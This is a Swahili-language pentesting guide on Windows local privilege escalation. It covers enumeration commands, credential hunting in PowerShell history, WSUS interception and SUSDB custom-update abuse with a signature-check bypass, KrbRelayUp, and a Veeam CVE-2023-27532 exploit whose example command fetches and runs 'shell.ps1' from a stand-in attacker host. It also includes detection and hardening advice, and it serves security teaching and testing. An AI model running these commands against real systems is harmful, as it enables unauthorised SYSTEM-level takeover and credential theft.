# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unaunganisha mbinu za jumla za Windows za privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mtiririko wake wa vitendo wa uchunguzi pia unatokana na warsha na orodha za ukaguzi za jumuiya.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Nyenzo za kihistoria za mashambulizi zinajumuisha wasilisho la DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

## Nadharia ya Msingi ya Windows

### Tokeni za Ufikiaji

**Ikiwa hujui tokeni za ufikiaji za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Viwango vya Uadilifu

**Ikiwa hujui viwango vya uadilifu katika Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna mambo mbalimbali katika Windows yanayoweza **kukuzuia kuchunguza mfumo**, kuendesha programu zinazotekelezeka au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na **kuchunguza** mifumo yote hii ya **ulinzi** kabla ya kuanza uchunguzi wa privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa NVRAM ya UEFI ukiwa nje ya mtandao kuwa mlolongo wa DMA kabla ya kuwasha na kurekebisha kumbukumbu ya Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / Kuinua Haki Kimya kwa UIAccess

Michakato ya UIAccess iliyoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa kufikia High IL bila maonyo, iwapo ukaguzi wa njia salama wa AppInfo utazungukwa. Angalia mtiririko maalum wa kupita UIAccess/Admin Protection hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa mipangilio ya registry ya ufikivu ya Secure Desktop unaweza kutumiwa kuandika thamani yoyote kwenye registry ya SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Miundo ya hivi karibuni ya Windows pia ilianzisha njia ya LPE ya **SMB kwenye port yoyote**, ambapo uthibitishaji wa NTLM wa ndani wenye upendeleo unaakisiwa kupitia muunganisho wa TCP wa SMB uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Uchunguzi wa taarifa za toleo

Angalia ikiwa toleo la Windows lina udhaifu wowote unaojulikana (pia kagua viraka vilivyosakinishwa).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Toleo

[Site hii](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **eneo kubwa la mashambulizi** linalotolewa na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyojumuishwa)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa kuhusu OS build, masasisho yaliyosakinishwa, na masasisho yanayoweza kuhusika; thibitisha bidhaa husika na masasisho yaliyotangulia kabla ya kudhani kuwa matokeo yanatumika.

Kwa local exploit inayohusiana na toleo maalum, kagua usanifu wa **process inayoendeshwa** pamoja na usanifu wa OS. Kwenye Windows ya 64-bit, process ya 32-bit huathiriwa na [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekezwa kwenye saraka ya mfumo ya 32-bit, huku `%windir%\Sysnative` ikiipa process hiyo ufikiaji wa saraka ya mfumo ya asili. Jina hilo mbadala halipatikani kwa process ya 64-bit. OS build au uwezekano wa KB kukosekana havithibitishi kuwa mfumo unaweza kudhulumiwa; linganisha build inayoendeshwa, sasisho lililosakinishwa au lililotangulia, usanifu wa process, na masharti ya exploit na [taarifa ya usalama ya Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) kuhusu suala husika.

**Ndani ya mfumo kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos za exploits kwenye Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Kuna credential/taarifa yoyote ya Juicy iliyohifadhiwa kwenye vigezo vya env?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha kipengele hiki katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [Sera ya PowerShell transcription](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili kwenye folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda inayoshirikiwa au iliyofichwa. Kagua njia halisi ya kuhifadhi na ACL za faili kabla ya kukagua transcript: huenda ikawa na hoja za amri na matokeo yake, ikiwemo credentials. Transcript inayosomeka ni kidokezo tu ikiwa maudhui yake yanafichua utambulisho wa kiwango cha juu unaoweza kutumika na utambulisho huo unaweza kuingia katika muktadha husika.

### Uwekaji wa Kumbukumbu wa PowerShell Module

Maelezo ya utekelezaji wa PowerShell pipeline hurekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo huenda yasirekodiwe.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kutazama matukio 15 ya mwisho kutoka kwenye log za PowersShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hunaswa, na kuhakikisha kuwa kila block ya code inaandikwa inapotekelezwa. Mchakato huu huhifadhi rekodi ya kina ya ukaguzi wa kila shughuli, ambayo ni muhimu kwa forensics na kuchanganua tabia hasidi. Kwa kurekodi shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato huo hutolewa.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana ndani ya Windows Event Viewer kwenye njia hii: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Kuangalia matukio 20 ya hivi karibuni, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Viendeshi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Mwongozo wa awali ulieleza hatari kama ifuatavyo:

Unaweza kuhatarisha mfumo ikiwa masasisho yataombwa kupitia http badala ya http**S**.

Endpoint ya WSUS inayotumia HTTP ni kidokezo cha kuchunguza uwezekano wa kuingilia metadata ya masasisho. Unyonyaji pia hutegemea kama mteja anatumia seva hiyo ya WSUS, kama mshambuliaji anaweza kuingilia au kudhibiti trafiki yake, na sera za mteja za uaminifu na usakinishaji wa masasisho. URL pekee haithibitishi kuwa utekelezaji wa msimbo utawezekana. [Microsoft inapendekeza TLS kwa metadata ya WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Unaanza kwa kuangalia kama mtandao unatumia sasisho la WSUS lisilotumia SSL kwa kutekeleza amri ifuatayo katika cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipokea jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kauli ya awali kuhusu uwezekano wa kutumia udhaifu ilikuwa:

Basi, **unaweza kuutumia.** Ikiwa thamani ya mwisho ya registry ni sawa na 0, basi ingizo la WSUS litapuuzwa.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intraneti iliyosanidiwa. Hii inathibitisha sharti la awali kwa njia ya kuingilia kati mawasiliano ya HTTP, lakini haithibitishi kwamba kuingilia kati, kukubali masasisho hasidi au kusakinisha kwa ruhusa za juu kunawezekana. Ikiwa ni `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haitachaguliwa na sera hiyo.

Ili kutumia udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM zilizotayarishwa kwa mashambulizi ili kuingiza masasisho 'bandia' kwenye trafiki ya WSUS isiyotumia SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, hili ndilo dosari inayotumiwa na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates inatumia proxy iliyosanidiwa kwenye mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya mashine yetu ili kuingilia trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye ruhusa za juu kwenye asset yetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, pia itatumia certificate store yake. Tukitengeneza certificate iliyosainiwa yenyewe kwa jina la hostname ya WSUS na kuiongeza kwenye certificate store ya mtumiaji wa sasa, tutaweza kuingilia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mifumo inayofanana na HSTS kutekeleza uthibitishaji wa aina ya trust-on-first-use kwenye certificate. Ikiwa certificate iliyowasilishwa inaaminika na mtumiaji na ina hostname sahihi, huduma itaikubali.

Unaweza kutumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (ikishachapishwa).

### Masasisho yanayodhibitiwa na msimamizi wa WSUS

Kuna njia tofauti iwapo identity ya sasa inaweza **kuchapisha na kuidhinisha** masasisho kwenye seva ya WSUS. Kagua uanachama unaotumika wa kundi la seva la `WSUS Administrators` pamoja na ruhusa zozote za WSUS zilizokasimiwa, kisha tambua kundi la kompyuta za wateja ambalo lingepokea sasisho lililoidhinishwa. [Microsoft inahitaji ruhusa za WSUS Administrator ili kuidhinisha masasisho](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini certificate ya kusaini inayotumika kwa maudhui yaliyochapishwa ndani ya mfumo. Thibitisha kwamba sasisho husika limesainiwa na kukubaliwa, linatumika kwa lengo, na linasakinishwa katika muktadha wenye ruhusa za juu zaidi kabla ya kuchukulia hili kama njia ya kupandisha ruhusa. Thamani ya HTTP `WUServer` au jina la kundi pekee havithibitishi masharti hayo.

### Matumizi mabaya ya masasisho maalum ya SUSDB: payloads zisizosainiwa kupitia `.txt`/`.esd`

Huu ni ukiukaji tofauti wa mpaka wa uaminifu na kuingilia muunganisho wa HTTP wa WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha wa **stored procedures za database ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha sasisho maalum. Njia moja ya vitendo ya kuingia ni kupeleka uthibitishaji wa akaunti ya kompyuta ya WSUS ya upstream kwa seva tofauti ya MSSQL inayohifadhi `SUSDB`; sharti kamili hutegemea usanidi husika, kwa hiyo kwanza orodhesha ruhusa za `EXECUTE` badala ya kudhani kuwa haki za msimamizi wa SQL zinahitajika.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya mashambulizi inayopeleka uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 kwenda LDAP, SMB au AD CS, angalia [Kutumia vibaya WSUS HTTP kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Thibitisha relay ya database ya nje na ruhusa za procedure

Katika usanidi ambapo WSUS hutumia SQL Server ya nje, kwanza hakikisha kama akaunti ya seva ya WSUS inaweza kujithibitisha kwenye database na kama NTLM relay inafika kwenye listener hiyo. Jukumu la SQL la seva linaweza kutoa uwezo wa kuchapisha masasisho kupitia procedures hata kama uandishi wa moja kwa moja kwenye jedwali umezuiwa; `UPDATE` iliyoshindwa kwenye `SUSDB` haithibitishi kuwa uchapishaji umezuiwa. Kagua identity inayotumika, uanachama wa role na ruhusa za procedure katika session ya SQL iliyoidhinishwa kabla ya kujaribu sasisho maalum.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Maelezo ya taratibu zilizopo na faili ya `SoftwareDistributionPackage.xsd` iliyosakinishwa yanafaa wakati wa kuunda upya metadata halali ya update. Parent ya bundle na child ya payload kila moja zinahitaji `UpdateIdentity` (aina ya fragment `1`), `LocalizedProperties` (`4`), na `ExtendedProperties` (`2`); hifadhi local revision ID inayorejeshwa na kila mwito wa `spImportUpdate` na uhakikishe kuwa uhusiano wa bundle, digest, ukubwa, content URL, na revision vinaendana. Huu ni mchakato wa uchapishaji unaohifadhi hali, kwa hiyo mwito mmoja tu uliofanikiwa wa stored procedure si uthibitisho wa utekelezaji upande wa client.<sup>[[38]](#references)</sup>

#### Unda, lenga na uidhinishe update

Mchakato wa custom-update hutumia taratibu halali za WSUS kama API yenye vikwazo ya uchapishaji. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya update | `spImportUpdate` |
| Hifadhi fragments za XML za masharti ya awali, zilizo lokalishwa na zilizopanuliwa | `spSaveXMLFragment` |
| Husisha digest ya maudhui na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/unda kundi la kompyuta na umwongeze client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kundi hilo | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

Jina la faili, digest, ukubwa na handler ya `CommandLineInstallation` lazima zilingane katika metadata/fragments zilizoingizwa. Baada ya kuweka content URL na kundi lengwa, idhini ya mwisho itafanana na ifuatayo; tumia vitambulishi vipya vya update, kundi na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Kukwepa uthibitishaji wa sahihi kwa kutumia kiendelezi

WSUS kwa kawaida hukataa maudhui holela ya executable yasiyo na sahihi. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka flag ya ukaguzi wa cheti kuwa false jina la faili lililotolewa linapoishia kwa `.txt` au `.esd`; kisha `CheckCertificateSignature` hurukwa bila kwanza kuthibitisha kwamba baiti hizo ni maandishi au picha halali ya ESD. Kwa hivyo, PE ambayo haijabadilishwa na imepewa jina kama `payload.exe.txt` inaweza kupita uthibitishaji wa maudhui na baadaye kuzinduliwa na handler ya usakinishaji ya command-line ya update. Hili ni hitilafu ya kuchanganya sera na aina, si kughushi sahihi.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging na automation inayooana na BITS

Kuita `spDeployUpdate` hufanya WSUS ipakue maudhui yaliyosajiliwa. Origin lazima itimize matarajio ya HTTP ya BITS: kuwa na URL inayofikika pekee hakutoshi kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Seva isiyotumia Range husababisha tukio la WSUS la usawazishaji `EventId=364`, linalosema kwamba BITS inahitaji kichwa cha itifaki ya Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) huzalisha SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, hujumuisha mteja wa MSSQL uliorekebishwa kwa ajili ya kuitekeleza, na huja na `BitsWebServer.py` kwa ajili ya kuweka maudhui. Mfano mdogo wa matumizi katika maabara iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji bila uangalizi na persistence ya kujaribu tena

Muingiliano wa upande wa mteja hutegemea sera. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo la `4 - Auto download and schedule install`, husababisha update iliyoidhinishwa kupakuliwa na kusakinishwa kwa ratiba iliyosanidiwa bila mtumiaji kuichagua mwenyewe. Katika majaribio, payload ambayo update yake ilibaki katika hali ya kushindwa/kutokamilika ilitolewa tena mara moja baada ya mchakato wa callback kutoka, kwa hiyo tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji unaojirudia; hali hii huonekana kwa urahisi kwa sababu mteja huonyesha hali ya update iliyoshindwa.<sup>[[39]](#references)</sup>

#### Njia za kuchunguza na kuimarisha usalama

Njia muhimu za kuchunguza upande wa server na mteja katika msururu huu ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate` kwenye `SUSDB`; chunguza target group mpya, vyanzo vya maudhui vya nje, payload za update za `.txt`/`.esd` na deployments zilizofanywa na principals zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` kwa `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` iliyoandikwa vibaya, na `EventId=364`; linganisha uthibitishaji na extension ya payload na magic ya maudhui badala ya kuamini suffix.
- Tafuta usakinishaji wa Windows Update unaoshindwa/kujaribu tena mara kwa mara, pamoja na utekelezaji wa PE au shughuli zisizotarajiwa za child/network kutoka kwa maudhui yenye majina ya `.txt` au `.esd`.
- Inapowezekana, hitaji Extended Protection for Authentication kwenye huduma ya database, na zuia ufikiaji wa mtandao wa database kwa WSUS server na mifumo ya usimamizi iliyoidhinishwa. Punguza na kagua haki za `EXECUTE` kwenye procedures za custom-update.

## Third-Party Auto-Updaters na Agent IPC (local privesc)

Agents nyingi za biashara hutoa sehemu ya localhost IPC na channel ya update yenye privileges za juu. Ikiwa enrollment inaweza kushawishiwa kuunganishwa na server ya mshambuliaji na updater ikaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI hasidi ambayo huduma ya SYSTEM huisakinisha. Tazama mbinu ya jumla (inayotegemea msururu wa Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Maelezo ya awali yaliyohusu toleo maalum na dokezo la upelelezi yalikuwa:

Veeam B&R < `11.0.1.1261` hutoa huduma ya localhost kwenye **TCP/9401** inayochakata ujumbe unaodhibitiwa na mshambuliaji, na kuruhusu amri zozote kutekelezwa kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Upelelezi**: thibitisha listener na toleo, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication na Cloud Connect hutumia huduma kuu ya backup kwenye **TCP/9401 kwa chaguomsingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji uthibitishaji wa credentials za database ya usanidi zilizosimbwa kwa njia fiche ndani ya mpaka wa mtandao wa backup; PoC nyingine ya umma inaonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Huduma inaweza kufungamana na anwani nyingine zaidi ya localhost, kwa hiyo kagua anwani na PID yake halisi.

- **Upelelezi**: thibitisha kuwa TCP/9401 ni ya `Veeam.Backup.Service.exe`, kisha kagua bidhaa iliyosakinishwa na metadata ya patches. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patches.
- **Matoleo ya chini yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kama matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathirika. Toleo la faili lenye sehemu nne pekee haliwezi kutofautisha base build isiyopakiwa patch na patch ya baadaye kwenye build hizo hizo. Thibitisha kitambulisho cha patch dhidi ya [historia ya build ya vendor](https://www.veeam.com/kb2680) kabla ya kutangaza boundary build kuwa imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika kwenye directory moja, kisha anzisha payload ya SYSTEM kupitia socket ya ndani:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Huduma hutekeleza amri kama SYSTEM.

PoC iliyotajwa inaonyesha utekelezaji wa amri kama SYSTEM wakati masharti yake ya ziada yametimizwa; ushauri wa vendor unaeleza tatizo la ufichuaji wa credential.

## KrbRelayUp

Maelezo ya awali kuhusu mazingira chaguomsingi yalikuwa:

Kuna uwezekano wa **local privilege escalation** katika mazingira ya **domain** ya Windows chini ya masharti mahususi. Masharti haya yanajumuisha mazingira ambapo **LDAP signing haijalazimishwa,** watumiaji wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na watumiaji wana uwezo wa kuunda kompyuta ndani ya domain. Ni muhimu kutambua kuwa **mahitaji** haya hutimizwa kwa kutumia **mipangilio chaguomsingi**.

Kerberos relay ya ndani inaweza kuvuka kutoka kwenye logon yenye ruhusa za chini hadi kwenye uandishi wa directory wenye ruhusa za juu, ikiwa COM server inayofaa itajithibitisha na principal iliyorudishwa ina ruhusa kwenye object lengwa. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) uandishi wa LDAP wa RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp hujiendesha kiotomatiki kwa baadhi ya njia hizi. Mlolongo wa RBCD unahitaji delegation inayotumika na ruhusa kwenye object lengwa, huku mlolongo wa shadow-credential ukihitaji ruhusa za kuandika key-credential na KDC inayotumia njia ya uthibitishaji wa certificate. Hakuna njia kati ya hizi inayotokana na uanachama wa domain pekee.

Kagua sera halisi ya DC ya [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya utambulisho unaorelayiwa, na viwango vya uthibitishaji na uigaji vya COM class iliyochaguliwa. Aina ya logon ya caller na muktadha wa credential ni muhimu: kipindi cha WinRM kinaweza kutenda tofauti na logon ya kuingiliana au ya new-credentials. Firewall/OXID routing na updates zilizosakinishwa pia zinaweza kubadilisha matokeo. Chukulia sera iliyoruhusu au ACL inayolingana kuwa jambo la kuchunguzwa; enumeration tulivu haipaswi kuanzisha COM coercion, relay authentication, au uandishi wa directory. Shadow credential ya machine-account inaweza kusababisha machine ticket, na tu ikiwa akaunti hiyo ina ruhusa zinazohitajika za directory replication, njia tofauti ya DCSync.

Tafuta **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

